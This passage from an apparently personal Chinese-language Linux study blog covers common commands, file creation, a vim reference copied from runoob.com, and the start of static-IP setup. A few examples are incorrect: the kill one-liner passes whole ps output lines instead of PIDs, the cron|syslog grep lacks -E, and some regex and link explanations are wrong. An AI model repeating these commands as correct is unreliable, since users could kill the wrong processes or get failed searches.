1.log,2.log 或tar -cvf log.*\n\n（2）将 &#x2F;etc 下的所有文件及目录打包到指定目录，并使用 gz 压缩\ntar -zcvf &#x2F;tmp&#x2F;etc.tar.gz &#x2F;etc\n\n（3）查看刚打包的文件内容（一定加z，因为是使用 gzip 压缩的）\ntar -ztvf &#x2F;tmp&#x2F;etc.tar.gz\n\n（4）要压缩打包 &#x2F;home, &#x2F;etc ，但不要 &#x2F;home&#x2F;dmtsai\ntar --exclude &#x2F;home&#x2F;dmtsai -zcvf myfile.tar.gz &#x2F;home&#x2F;* &#x2F;etc\n\nchown 命令chown 将指定文件的拥有者改为指定的用户或组，用户可以是用户名或者用户 ID；组可以是组名或者组 ID；文件是以空格分开的要改变权限的文件列表，支持通配符。\n-c 显示更改的部分的信息\n-R 处理指定目录及子目录\n\n实例：\n（1）改变拥有者和群组 并显示改变信息\nchown -c mail:mail log2012.log\n\n（2）改变文件群组\nchown -c :mail t.log\n\n（3）改变文件夹及子文件目录属主及属组为 mail\nchown -cR mail: test&#x2F;\n\ndf 命令显示磁盘空间使用情况。获取硬盘被占用了多少空间，目前还剩下多少空间等信息，如果没有文件名被指定，则所有当前被挂载的文件系统的可用空间将被显示。默认情况下，磁盘空间将以 1KB 为单位进行显示，除非环境变量 POSIXLY_CORRECT 被指定，那样将以512字节为单位进行显示：\n-a 全部文件系统列表\n-h 以方便阅读的方式显示信息\n-i 显示inode信息\n-k 区块为1024字节\n-l 只显示本地磁盘\n-T 列出文件系统类型\n\n实例：\n（1）显示磁盘使用情况\ndf -l\n\n（2）以易读方式列出所有文件系统及其类型\ndf -haT\n\ndu 命令du 命令也是查看使用空间的，但是与 df 命令不同的是 Linux du 命令是对文件和目录磁盘使用的空间的查看：\n命令格式：\ndu [选项] [文件]\n\n常用参数：\n-a 显示目录中所有文件大小\n-k 以KB为单位显示文件大小\n-m 以MB为单位显示文件大小\n-g 以GB为单位显示文件大小\n-h 以易读方式显示文件大小\n-s 仅显示总计\n-c或--total  除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和\n\n实例：\n（1）以易读方式显示文件夹内及子文件夹大小\ndu -h scf&#x2F;\n\n（2）以易读方式显示文件夹内所有文件大小\ndu -ah scf&#x2F;\n\n（3）显示几个文件或目录各自占用磁盘空间的大小，还统计它们的总和\ndu -hc test&#x2F; scf&#x2F;\n\n（4）输出当前目录下各个子目录所使用的空间\ndu -hc --max-depth&#x3D;1 scf&#x2F;\n\nln 命令功能是为文件在另外一个位置建立一个同步的链接，当在不同目录需要该问题时，就不需要为每一个目录创建同样的文件，通过 ln 创建的链接（link）减少磁盘占用量。\n链接分类：软件链接及硬链接\n软链接：\n\n1.软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式\n2.软链接可以 跨文件系统 ，硬链接不可以\n3.软链接可以对一个不存在的文件名进行链接\n4.软链接可以对目录进行链接\n\n硬链接:\n\n1.硬链接，以文件副本的形式存在。但不占用实际空间。\n2.不允许给目录创建硬链接\n3.硬链接只有在同一个文件系统中才能创建\n\n需要注意：\n\n第一：ln命令会保持每一处链接文件的同步性，也就是说，不论你改动了哪一处，其它的文件都会发生相同的变化；\n第二：ln的链接又分软链接和硬链接两种，软链接就是ln –s 源文件 目标文件，它只会在你选定的位置上生成一个文件的镜像，不会占用磁盘空间，硬链接 ln 源文件 目标文件，没有参数-s， 它会在你选定的位置上生成一个和源文件大小相同的文件，无论是软链接还是硬链接，文件都保持同步变化。\n第三：ln指令用在链接文件或目录，如同时指定两个以上的文件或目录，且最后的目的地是一个已经存在的目录，则会把前面指定的所有文件或目录复制到该目录中。若同时指定多个文件或目录，且最后的目的地并非是一个已存在的目录，则会出现错误信息。\n\n常用参数：\n-b 删除，覆盖以前建立的链接\n-s 软链接（符号链接）\n-v 显示详细处理过程\n\n实例：\n（1）给文件创建软链接，并显示操作信息\nln -sv source.log link.log\n\n（2）给文件创建硬链接，并显示操作信息\nln -v source.log link1.log\n\n（3）给目录创建软链接\nln -sv &#x2F;opt&#x2F;soft&#x2F;test&#x2F;test3 &#x2F;opt&#x2F;soft&#x2F;test&#x2F;test5\n\ndate 命令显示或设定系统的日期与时间。\n命令参数：\n-d&lt;字符串&gt; 　显示字符串所指的日期与时间。字符串前后必须加上双引号。\n-s&lt;字符串&gt; 　根据字符串来设置日期与时间。字符串前后必须加上双引号。\n-u 　显示GMT。\n%H 小时(00-23)\n%I 小时(00-12)\n%M 分钟(以00-59来表示)\n%s 总秒数。起算时间为1970-01-01 00:00:00 UTC。\n%S 秒(以本地的惯用法来表示)\n%a 星期的缩写。\n%A 星期的完整名称。\n%d 日期(以01-31来表示)。\n%D 日期(含年月日)。\n%m 月份(以01-12来表示)。\n%y 年份(以00-99来表示)。\n%Y 年份(以四位数来表示)。\n\n实例：\n（1）显示下一天\ndate +%Y%m%d --date&#x3D;&quot;+1 day&quot;  &#x2F;&#x2F;显示下一天的日期\n\n（2）-d参数使用\ndate -d &quot;nov 22&quot;  今年的 11 月 22 日是星期三\ndate -d &#39;2 weeks&#39; 2周后的日期\ndate -d &#39;next monday&#39; (下周一的日期)\ndate -d next-day +%Y%m%d（明天的日期）或者：date -d tomorrow +%Y%m%d\ndate -d last-day +%Y%m%d(昨天的日期) 或者：date -d yesterday +%Y%m%d\ndate -d last-month +%Y%m(上个月是几月)\ndate -d next-month +%Y%m(下个月是几月)\n\ncal 命令可以用户显示公历（阳历）日历如只有一个参数，则表示年份(1-9999)，如有两个参数，则表示月份和年份：\n常用参数：\n-3 显示前一月，当前月，后一月三个月的日历\n-m 显示星期一为第一列\n-j 显示在当前年第几天\n-y [year]显示当前年[year]份的日历\n\n实例：\n（1）显示指定年月日期\ncal 9 2012\n\n（2）显示2013年每个月日历\ncal -y 2013\n\n（3）将星期一做为第一列,显示前中后三月\ncal -3m\n\ngrep 命令强大的文本搜索命令，grep(Global Regular Expression Print) 全局正则表达式搜索。\ngrep 的工作方式是这样的，它在一个或多个文件中搜索字符串模板。如果模板包括空格，则必须被引用，模板后的所有字符串被看作文件名。搜索的结果被送到标准输出，不影响原文件内容。\n命令格式：\ngrep [option] pattern file|dir\n\n常用参数：\n-A n --after-context显示匹配字符后n行\n-B n --before-context显示匹配字符前n行\n-C n --context 显示匹配字符前后n行\n-c --count 计算符合样式的列数\n-i 忽略大小写\n-l 只列出文件内容符合指定的样式的文件名称\n-f 从文件中读取关键词\n-n 显示匹配内容的所在文件中行数\n-R 递归查找文件夹\n\ngrep 的规则表达式:\n^  #锚定行的开始 如：&#39;^grep&#39;匹配所有以grep开头的行。 \n$  #锚定行的结束 如：&#39;grep$&#39;匹配所有以grep结尾的行。 \n.  #匹配一个非换行符的字符 如：&#39;gr.p&#39;匹配gr后接一个任意字符，然后是p。  \n*  #匹配零个或多个先前字符 如：&#39;*grep&#39;匹配所有一个或多个空格后紧跟grep的行。\n.*   #一起用代表任意字符。  \n[]   #匹配一个指定范围内的字符，如&#39;[Gg]rep&#39;匹配Grep和grep。 \n[^]  #匹配一个不在指定范围内的字符，如：&#39;[^A-FH-Z]rep&#39;匹配不包含A-R和T-Z的一个字母开头，紧跟rep的行。  \n\\(..\\)  #标记匹配字符，如&#39;\\(love\\)&#39;，love被标记为1。   \n\\&lt;      #锚定单词的开始，如:&#39;\\&lt;grep&#39;匹配包含以grep开头的单词的行。\n\\&gt;      #锚定单词的结束，如&#39;grep\\&gt;&#39;匹配包含以grep结尾的单词的行。\nx\\&#123;m\\&#125;  #重复字符x，m次，如：&#39;0\\&#123;5\\&#125;&#39;匹配包含5个o的行。 \nx\\&#123;m,\\&#125;  #重复字符x,至少m次，如：&#39;o\\&#123;5,\\&#125;&#39;匹配至少有5个o的行。  \nx\\&#123;m,n\\&#125;  #重复字符x，至少m次，不多于n次，如：&#39;o\\&#123;5,10\\&#125;&#39;匹配5--10个o的行。  \n\\w    #匹配文字和数字字符，也就是[A-Za-z0-9]，如：&#39;G\\w*p&#39;匹配以G后跟零个或多个文字或数字字符，然后是p。  \n\\W    #\\w的反置形式，匹配一个或多个非单词字符，如点号句号等。  \n\\b    #单词锁定符，如: &#39;\\bgrep\\b&#39;只匹配grep。\n\n实例：\n（1）查找指定进程\nps -ef | grep svn\n\n（2）查找指定进程个数\nps -ef | grep svn -c\n\n（3）从文件中读取关键词\ncat test1.txt | grep -f key.log\n\n（4）从文件夹中递归查找以grep开头的行，并只列出文件\ngrep -lR &#39;^grep&#39; &#x2F;tmp\n\n（5）查找非x开关的行内容\ngrep &#39;^[^x]&#39; test.txt\n\n（6）显示包含 ed 或者 at 字符的内容行\ngrep -E &#39;ed|at&#39; test.txt\n\nwc(word count)功能为统计指定的文件中字节数、字数、行数，并将统计结果输出\n命令格式：\nwc [option] file..\n\n命令参数：\n-c 统计字节数\n-l 统计行数\n-m 统计字符数\n-w 统计词数，一个字被定义为由空白、跳格或换行字符分隔的字符串\n\n实例：\n（1）查找文件的 行数 单词数 字节数 文件名\nwc text.txt\n\n结果：\n7     8     70     test.txt\n\n（2）统计输出结果的行数\ncat test.txt | wc -l\n\nps 命令ps(process status)，用来查看当前运行的进程状态，一次性查看，如果需要动态连续结果使用 top\nlinux上进程有5种状态:\n\n\\1. 运行(正在运行或在运行队列中等待)\n\\2. 中断(休眠中, 受阻, 在等待某个条件的形成或接受到信号)\n\\3. 不可中断(收到信号不唤醒和不可运行, 进程必须等待直到有中断发生)\n\\4. 僵死(进程已终止, 但进程描述符存在, 直到父进程调用wait4()系统调用后释放)\n\\5. 停止(进程收到SIGSTOP, SIGSTP, SIGTIN, SIGTOU信号后停止运行运行)\n\nps 工具标识进程的5种状态码:\nD 不可中断 uninterruptible sleep (usually IO)\nR 运行 runnable (on run queue)\nS 中断 sleeping\nT 停止 traced or stopped\nZ 僵死 a defunct (”zombie”) process\n\n命令参数：\n-A 显示所有进程\na 显示所有进程\n-a 显示同一终端下所有进程\nc 显示进程真实名称\ne 显示环境变量\nf 显示进程间的关系\nr 显示当前终端运行的进程\n-aux 显示所有包含其它使用的进程\n\n实例：\n（1）显示当前所有进程环境变量及进程间关系\nps -ef\n\n（2）显示当前所有进程\nps -A\n\n（3）与grep联用查找某进程\nps -aux | grep apache\n\n（4）找出与 cron 与 syslog 这两个服务有关的 PID 号码\nps aux | grep &#39;(cron|syslog)&#39;\n\n29、top 命令\n显示当前系统正在执行的进程的相关信息，包括进程 ID、内存占用率、CPU 占用率等\n常用参数：\n-c 显示完整的进程命令\n-s 保密模式\n-p &lt;进程号&gt; 指定进程显示\n-n &lt;次数&gt;循环显示次数\n\n实例：\n（1）\ntop - 14:06:23 up 70 days, 16:44,  2 users,  load average: 1.25, 1.32, 1.35\nTasks: 206 total,   1 running, 205 sleeping,   0 stopped,   0 zombie\nCpu(s):  5.9%us,  3.4%sy,  0.0%ni, 90.4%id,  0.0%wa,  0.0%hi,  0.2%si,  0.0%st\nMem:  32949016k total, 14411180k used, 18537836k free,   169884k buffers\nSwap: 32764556k total,        0k used, 32764556k free,  3612636k cached\nPID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND  \n28894 root      22   0 1501m 405m  10m S 52.2  1.3   2534:16 java  \n\n前五行是当前系统情况整体的统计信息区。\n第一行，任务队列信息，同 uptime 命令的执行结果，具体参数说明情况如下：\n14:06:23 — 当前系统时间\nup 70 days, 16:44 — 系统已经运行了70天16小时44分钟（在这期间系统没有重启过的吆！）\n2 users — 当前有2个用户登录系统\nload average: 1.15, 1.42, 1.44 — load average后面的三个数分别是1分钟、5分钟、15分钟的负载情况。\nload average数据是每隔5秒钟检查一次活跃的进程数，然后按特定算法计算出的数值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。\n第二行，Tasks — 任务（进程），具体信息说明如下：\n系统现在共有206个进程，其中处于运行中的有1个，205个在休眠（sleep），stoped状态的有0个，zombie状态（僵尸）的有0个。\n第三行，cpu状态信息，具体属性说明如下：\n5.9%us — 用户空间占用CPU的百分比。\n3.4% sy — 内核空间占用CPU的百分比。\n0.0% ni — 改变过优先级的进程占用CPU的百分比\n90.4% id — 空闲CPU百分比\n0.0% wa — IO等待占用CPU的百分比\n0.0% hi — 硬中断（Hardware IRQ）占用CPU的百分比\n0.2% si — 软中断（Software Interrupts）占用CPU的百分比\n\n备注：在这里CPU的使用比率和windows概念不同，需要理解linux系统用户空间和内核空间的相关知识！\n第四行，内存状态，具体信息如下：\n32949016k total — 物理内存总量（32GB）\n14411180k used — 使用中的内存总量（14GB）\n18537836k free — 空闲内存总量（18GB）\n169884k buffers — 缓存的内存量 （169M）\n\n第五行，swap交换分区信息，具体信息说明如下：\n32764556k total — 交换区总量（32GB）\n0k used — 使用的交换区总量（0K）\n32764556k free — 空闲交换区总量（32GB）\n3612636k cached — 缓冲的交换区总量（3.6GB）\n\n第六行，空行。\n第七行以下：各进程（任务）的状态监控，项目列信息说明如下：\nPID — 进程id\nUSER — 进程所有者\nPR — 进程优先级\nNI — nice值。负值表示高优先级，正值表示低优先级\nVIRT — 进程使用的虚拟内存总量，单位kb。VIRT&#x3D;SWAP+RES\nRES — 进程使用的、未被换出的物理内存大小，单位kb。RES&#x3D;CODE+DATA\nSHR — 共享内存大小，单位kb\nS — 进程状态。D&#x3D;不可中断的睡眠状态 R&#x3D;运行 S&#x3D;睡眠 T&#x3D;跟踪&#x2F;停止 Z&#x3D;僵尸进程\n%CPU — 上次更新到现在的CPU时间占用百分比\n%MEM — 进程使用的物理内存百分比\nTIME+ — 进程使用的CPU时间总计，单位1&#x2F;100秒\nCOMMAND — 进程名称（命令名&#x2F;命令行）\n\ntop 交互命令\nh 显示top交互命令帮助信息\nc 切换显示命令名称和完整命令行\nm 以内存使用率排序\nP 根据CPU使用百分比大小进行排序\nT 根据时间&#x2F;累计时间进行排序\nW 将当前设置写入~&#x2F;.toprc文件中\no或者O 改变显示项目的顺序\n\nkill 命令发送指定的信号到相应进程。不指定型号将发送SIGTERM（15）终止指定进程。如果任无法终止该程序可用”-KILL” 参数，其发送的信号为SIGKILL(9) ，将强制结束进程，使用ps命令或者jobs 命令可以查看进程号。root用户将影响用户的进程，非root用户只能影响自己的进程。\n常用参数：\n-l  信号，若果不加信号的编号参数，则使用“-l”参数会列出全部的信号名称\n-a  当处理当前进程时，不限制命令名和进程号的对应关系\n-p  指定kill 命令只打印相关进程的进程号，而不发送任何信号\n-s  指定发送信号\n-u  指定用户\n\n实例：\n（1）先使用ps查找进程pro1，然后用kill杀掉\nkill -9 $(ps -ef | grep pro1)\n\nfree 命令显示系统内存使用情况，包括物理内存、交互区内存(swap)和内核缓冲区内存。\n命令参数：\n-b 以Byte显示内存使用情况\n-k 以kb为单位显示内存使用情况\n-m 以mb为单位显示内存使用情况\n-g 以gb为单位显示内存使用情况\n-s&lt;间隔秒数&gt; 持续显示内存\n-t 显示内存使用总合\n\n实例：\n（1）显示内存使用情况\nfree\nfree -k\nfree -m\n\n（2）以总和的形式显示内存的使用信息\nfree -t\n\n（3）周期性查询内存使用情况\nfree -s 10\n\n\n\n五:文本编辑器vi的使用文本文件的创建在Linux上使用重定向符（&gt;）创建一个文件标准重定向符允许我们创建一个0KB的空文件。它通常用于重定向一个命令的输出到一个新文件中。在没有命令的情况下使用重定向符时，它会创建一个文件。\n[root@mycentos test]# &gt; test.txt 111\n-bash: 111: command not found\n[root@mycentos test]# &gt; test.txt\n[root@mycentos test]# ls\ntest.txt\n[root@mycentos test]# cat test.txt\n[root@mycentos test]# \n\n在Linux上使用touch命令创建一个文件touch命令常用于将每个文件的访问和修改时间更新为当前时间。如果指定文件名不存在，就将新建一个文件。\n[root@mycentos test]# touch test2.txt\n[root@mycentos test]# ls\ntest2.txt  test.txt\n[root@mycentos test]# \n\n在linux上使用echo命令创建一个文件echo内置于大多数操作系统中，他常用于脚本，批处理文件，以及作为插入文本的单个命令的一部分。\n[root@mycentos test]# echo &quot;111&quot; &gt; test3.txt\n[root@mycentos test]# ls\ntest2.txt  test3.txt  test.txt\n[root@mycentos test]# cat test3.txt\n111\n\n或者\n[root@mycentos test]# cat &gt; test6.txt &lt;&lt; end\n&gt; 1\n&gt; 2\n&gt; 3\n&gt; end\n[root@mycentos test]# cat test6.txt\n1\n2\n3\n[root@mycentos test]# \n\n在linux中使用cat创建一个文件cat表示串联concatrenate。在linux中进场用于读取一个文件中的数据。\n[root@mycentos test]# cat &gt; test4.txt\n111\n222\n333^C\n[root@mycentos test]# ls\ntest2.txt  test3.txt  test4.txt  test.txt\n[root@mycentos test]# cat test4.txt\n111\n222\n[root@mycentos test]# \n\n在linux中使用vi&#x2F;vm命令创建一个文件Vim 是从 vi 发展出来的一个文本编辑器。他通常用于编辑所有种类的纯文本。\n[root@mycentos test]# vi test5.txt\n[root@mycentos test]# ls\ntest2.txt  test3.txt  test4.txt  test5.txt  test.txt\n\n\n\n至于vi&#x2F;vim的使用,由于内容极多而且都很重要,所以我直接把菜鸟教程的参考文章贴过来了,反正都是给自己查资料的时候用,能看明白就行\n\n\n\n\n\n\n\n\n\n文章出处\nhttps://www.runoob.com/linux/linux-vim.html\nLinux vi&#x2F;vim所有的 Unix Like 系统都会内建 vi 文书编辑器，其他的文书编辑器则不一定会存在。\n但是目前我们使用比较多的是 vim 编辑器。\nvim 具有程序编辑的能力，可以主动的以字体颜色辨别语法的正确性，方便程序设计。\n相关文章：史上最全Vim快捷键键位图 — 入门到进阶\n\n什么是 vim？Vim 是从 vi 发展出来的一个文本编辑器。代码补全、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。\n简单的来说， vi 是老式的字处理器，不过功能已经很齐全了，但是还是有可以进步的地方。 vim 则可以说是程序开发者的一项很好用的工具。\n连 vim 的官方网站 (https://www.vim.org/) 自己也说 vim 是一个程序开发工具而不是文字处理软件。\nvim 键盘图：\n\n\nvi&#x2F;vim 的使用基本上 vi&#x2F;vim 共分为三种模式，分别是命令模式（Command mode），输入模式（Insert mode）和底线命令模式（Last line mode）。 这三种模式的作用分别是：\n命令模式：用户刚刚启动 vi&#x2F;vim，便进入了命令模式。\n此状态下敲击键盘动作会被Vim识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。\n以下是常用的几个命令：\n\ni 切换到输入模式，以输入字符。\nx 删除当前光标所在处的字符。\n: 切换到底线命令模式，以在最底一行输入命令。\n\n若想要编辑文本：启动Vim，进入了命令模式，按下i，切换到输入模式。\n命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。\n输入模式在命令模式下按下i就进入了输入模式。\n在输入模式中，可以使用以下按键：\n\n字符按键以及Shift组合，输入字符\nENTER，回车键，换行\nBACK SPACE，退格键，删除光标前一个字符\nDEL，删除键，删除光标后一个字符\n方向键，在文本中移动光标\nHOME&#x2F;END，移动光标到行首&#x2F;行尾\nPage Up&#x2F;Page Down，上&#x2F;下翻页\nInsert，切换光标为输入&#x2F;替换模式，光标将变成竖线&#x2F;下划线\nESC，退出输入模式，切换到命令模式\n\n底线命令模式在命令模式下按下:（英文冒号）就进入了底线命令模式。\n底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。\n在底线命令模式中，基本的命令有（已经省略了冒号）：\n\nq 退出程序\nw 保存文件\n\n按ESC键可随时退出底线命令模式。\n简单的说，我们可以将这三个模式想成底下的图标来表示：\n\n\nvi&#x2F;vim 使用实例使用 vi&#x2F;vim 进入一般模式如果你想要使用 vi 来建立一个名为 runoob.txt 的文件时，你可以这样做：\n$ vim runoob.txt\n\n直接输入 vi 文件名 就能够进入 vi 的一般模式了。请注意，记得 vi 后面一定要加文件名，不管该文件存在与否！\n\n按下 i 进入输入模式(也称为编辑模式)，开始编辑文字在一般模式之中，只要按下 i, o, a 等字符就可以进入输入模式了！\n在编辑模式当中，你可以发现在左下角状态栏中会出现 –INSERT- 的字样，那就是可以输入任意字符的提示。\n这个时候，键盘上除了 Esc 这个按键之外，其他的按键都可以视作为一般的输入按钮了，所以你可以进行任何的编辑。\n\n按下 ESC 按钮回到一般模式好了，假设我已经按照上面的样式给他编辑完毕了，那么应该要如何退出呢？是的！没错！就是给他按下 Esc 这个按钮即可！马上你就会发现画面左下角的 – INSERT – 不见了！\n在一般模式中按下 :wq 储存后离开 viOK，我们要存档了，存盘并离开的指令很简单，输入 :wq 即可保存离开！\n\nOK! 这样我们就成功创建了一个 runoob.txt 的文件。\n\nvi&#x2F;vim 按键说明除了上面简易范例的 i, Esc, :wq 之外，其实 vim 还有非常多的按键可以使用。\n第一部分：一般模式可用的光标移动、复制粘贴、搜索替换等\n\n\n移动光标的方法\n\n\n\n\nh 或 向左箭头键(←)\n光标向左移动一个字符\n\n\nj 或 向下箭头键(↓)\n光标向下移动一个字符\n\n\nk 或 向上箭头键(↑)\n光标向上移动一个字符\n\n\nl 或 向右箭头键(→)\n光标向右移动一个字符\n\n\n如果你将右手放在键盘上的话，你会发现 hjkl 是排列在一起的，因此可以使用这四个按钮来移动光标。 如果想要进行多次移动的话，例如向下移动 30 行，可以使用 “30j” 或 “30↓” 的组合按键， 亦即加上想要进行的次数(数字)后，按下动作即可！\n\n\n\n[Ctrl] + [f]\n屏幕『向下』移动一页，相当于 [Page Down]按键 (常用)\n\n\n[Ctrl] + [b]\n屏幕『向上』移动一页，相当于 [Page Up] 按键 (常用)\n\n\n[Ctrl] + [d]\n屏幕『向下』移动半页\n\n\n[Ctrl] + [u]\n屏幕『向上』移动半页\n\n\n+\n光标移动到非空格符的下一行\n\n\n-\n光标移动到非空格符的上一行\n\n\nn\n那个 n 表示『数字』，例如 20 。按下数字后再按空格键，光标会向右移动这一行的 n 个字符。例如 20 则光标会向后面移动 20 个字符距离。\n\n\n0 或功能键[Home]\n这是数字『 0 』：移动到这一行的最前面字符处 (常用)\n\n\n$ 或功能键[End]\n移动到这一行的最后面字符处(常用)\n\n\nH\n光标移动到这个屏幕的最上方那一行的第一个字符\n\n\nM\n光标移动到这个屏幕的中央那一行的第一个字符\n\n\nL\n光标移动到这个屏幕的最下方那一行的第一个字符\n\n\nG\n移动到这个档案的最后一行(常用)\n\n\nnG\nn 为数字。移动到这个档案的第 n 行。例如 20G 则会移动到这个档案的第 20 行(可配合 :set nu)\n\n\ngg\n移动到这个档案的第一行，相当于 1G 啊！ (常用)\n\n\nn\nn 为数字。光标向下移动 n 行(常用)\n\n\n搜索替换\n\n\n\n&#x2F;word\n向光标之下寻找一个名称为 word 的字符串。例如要在档案内搜寻 vbird 这个字符串，就输入 &#x2F;vbird 即可！ (常用)\n\n\n?word\n向光标之上寻找一个字符串名称为 word 的字符串。\n\n\nn\n这个 n 是英文按键。代表重复前一个搜寻的动作。举例来说， 如果刚刚我们执行 &#x2F;vbird 去向下搜寻 vbird 这个字符串，则按下 n 后，会向下继续搜寻下一个名称为 vbird 的字符串。如果是执行 ?vbird 的话，那么按下 n 则会向上继续搜寻名称为 vbird 的字符串！\n\n\nN\n这个 N 是英文按键。与 n 刚好相反，为『反向』进行前一个搜寻动作。 例如 &#x2F;vbird 后，按下 N 则表示『向上』搜寻 vbird 。\n\n\n使用 &#x2F;word 配合 n 及 N 是非常有帮助的！可以让你重复的找到一些你搜寻的关键词！\n\n\n\n:n1,n2s&#x2F;word1&#x2F;word2&#x2F;g\nn1 与 n2 为数字。在第 n1 与 n2 行之间寻找 word1 这个字符串，并将该字符串取代为 word2 ！举例来说，在 100 到 200 行之间搜寻 vbird 并取代为 VBIRD 则： 『:100,200s&#x2F;vbird&#x2F;VBIRD&#x2F;g』。(常用)\n\n\n:1,$s&#x2F;word1&#x2F;word2&#x2F;g 或 :%s&#x2F;word1&#x2F;word2&#x2F;g\n从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！(常用)\n\n\n:1,$s&#x2F;word1&#x2F;word2&#x2F;gc 或 :%s&#x2F;word1&#x2F;word2&#x2F;gc\n从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！且在取代前显示提示字符给用户确认 (confirm) 是否需要取代！(常用)\n\n\n删除、复制与贴上\n\n\n\nx, X\n在一行字当中，x 为向后删除一个字符 (相当于 [del] 按键)， X 为向前删除一个字符(相当于 [backspace] 亦即是退格键) (常用)\n\n\nnx\nn 为数字，连续向后删除 n 个字符。举例来说，我要连续删除 10 个字符， 『10x』。\n\n\ndd\n剪切游标所在的那一整行(常用)，用 p&#x2F;P 可以粘贴。\n\n\nndd\nn 为数字。剪切光标所在的向下 n 行，例如 20dd 则是剪切 20 行(常用)，用 p&#x2F;P 可以粘贴。\n\n\nd1G\n删除光标所在到第一行的所有数据\n\n\ndG\n删除光标所在到最后一行的所有数据\n\n\nd$\n删除游标所在处，到该行的最后一个字符\n\n\nd0\n那个是数字的 0 ，删除游标所在处，到该行的最前面一个字符\n\n\nyy\n复制游标所在的那一行(常用)\n\n\nnyy\nn 为数字。复制光标所在的向下 n 行，例如 20yy 则是复制 20 行(常用)\n\n\ny1G\n复制游标所在行到第一行的所有数据\n\n\nyG\n复制游标所在行到最后一行的所有数据\n\n\ny0\n复制光标所在的那个字符到该行行首的所有数据\n\n\ny$\n复制光标所在的那个字符到该行行尾的所有数据\n\n\np, P\np 为将已复制的数据在光标下一行贴上，P 则为贴在游标上一行！ 举例来说，我目前光标在第 20 行，且已经复制了 10 行数据。则按下 p 后， 那 10 行数据会贴在原本的 20 行之后，亦即由 21 行开始贴。但如果是按下 P 呢？ 那么原本的第 20 行会被推到变成 30 行。 (常用)\n\n\nJ\n将光标所在行与下一行的数据结合成同一行\n\n\nc\n重复删除多个数据，例如向下删除 10 行，[ 10cj ]\n\n\nu\n复原前一个动作。(常用)\n\n\n[Ctrl]+r\n重做上一个动作。(常用)\n\n\n这个 u 与 [Ctrl]+r 是很常用的指令！一个是复原，另一个则是重做一次～ 利用这两个功能按键，你的编辑，嘿嘿！很快乐的啦！\n\n\n\n.\n不要怀疑！这就是小数点！意思是重复前一个动作的意思。 如果你想要重复删除、重复贴上等等动作，按下小数点『.』就好了！ (常用)\n\n\n第二部分：一般模式切换到编辑模式的可用的按钮说明\n\n\n进入输入或取代的编辑模式\n\n\n\n\ni, I\n进入输入模式(Insert mode)： i 为『从目前光标所在处输入』， I 为『在目前所在行的第一个非空格符处开始输入』。 (常用)\n\n\na, A\n进入输入模式(Insert mode)： a 为『从目前光标所在的下一个字符处开始输入』， A 为『从光标所在行的最后一个字符处开始输入』。(常用)\n\n\no, O\n进入输入模式(Insert mode)： 这是英文字母 o 的大小写。o 为在目前光标所在的下一行处输入新的一行； O 为在目前光标所在的上一行处输入新的一行！(常用)\n\n\nr, R\n进入取代模式(Replace mode)： r 只会取代光标所在的那一个字符一次；R会一直取代光标所在的文字，直到按下 ESC 为止；(常用)\n\n\n上面这些按键中，在 vi 画面的左下角处会出现『–INSERT–』或『–REPLACE–』的字样。 由名称就知道该动作了吧！！特别注意的是，我们上面也提过了，你想要在档案里面输入字符时， 一定要在左下角处看到 INSERT 或 REPLACE 才能输入喔！\n\n\n\n[Esc]\n退出编辑模式，回到一般模式中(常用)\n\n\n第三部分：一般模式切换到指令行模式的可用的按钮说明\n\n\n指令行的储存、离开等指令\n\n\n\n\n:w\n将编辑的数据写入硬盘档案中(常用)\n\n\n:w!\n若文件属性为『只读』时，强制写入该档案。不过，到底能不能写入， 还是跟你对该档案的档案权限有关啊！\n\n\n:q\n离开 vi (常用)\n\n\n:q!\n若曾修改过档案，又不想储存，使用 ! 为强制离开不储存档案。\n\n\n注意一下啊，那个惊叹号 (!) 在 vi 当中，常常具有『强制』的意思～\n\n\n\n:wq\n储存后离开，若为 :wq! 则为强制储存后离开 (常用)\n\n\nZZ\n这是大写的 Z 喔！如果修改过，保存当前文件，然后退出！效果等同于(保存并退出)\n\n\nZQ\n不保存，强制退出。效果等同于 **:q!**。\n\n\n:w [filename]\n将编辑的数据储存成另一个档案（类似另存新档）\n\n\n:r [filename]\n在编辑的数据中，读入另一个档案的数据。亦即将 『filename』 这个档案内容加到游标所在行后面\n\n\n:n1,n2 w [filename]\n将 n1 到 n2 的内容储存成 filename 这个档案。\n\n\n:! command\n暂时离开 vi 到指令行模式下执行 command 的显示结果！例如 『:! ls &#x2F;home』即可在 vi 当中察看 &#x2F;home 底下以 ls 输出的档案信息！\n\n\nvim 环境的变更\n\n\n\n:set nu\n显示行号，设定之后，会在每一行的前缀显示该行的行号\n\n\n:set nonu\n与 set nu 相反，为取消行号！\n\n\n\n特别注意，在 vi&#x2F;vim 中，数字是很有意义的！数字通常代表重复做几次的意思！ 也有可能是代表去到第几个什么什么的意思。\n举例来说，要删除 50 行，则是用 『50dd』 对吧！ 数字加在动作之前，如我要向下移动 20 行呢？那就是『20j』或者是『20↓』即可。\n用vi修改IP地址为静态IP默认情况下,Linux的IP地址为DHCP动态分配,而面向服务器应用场景,通常建议设置为静态IP,操作步骤如下\n查看默认网关ip route\n[root@mycentos opt]# ip route\ndefault via 192.168.2.1 dev ens33 proto static metric 100 \n192.168.2.0&#x2F;24 dev ens33 proto kernel scope link src 192.168.2.112 metric 100 \n\n即网关地址为:192.168.2.1\ndns如果没有指定的话可以设置成网关地址,也可以用公网的dns服务器,比如114.114.114.114,8.8.8.8\n确认动态IP地址及网段等信息ip addr\n[root@mycentos opt]# ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link&#x2F;loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1&#x2F;8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1&#x2F;128 scope host \n       valid_lft forever preferred_lft forever\n2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000\n    link&#x2F;ether 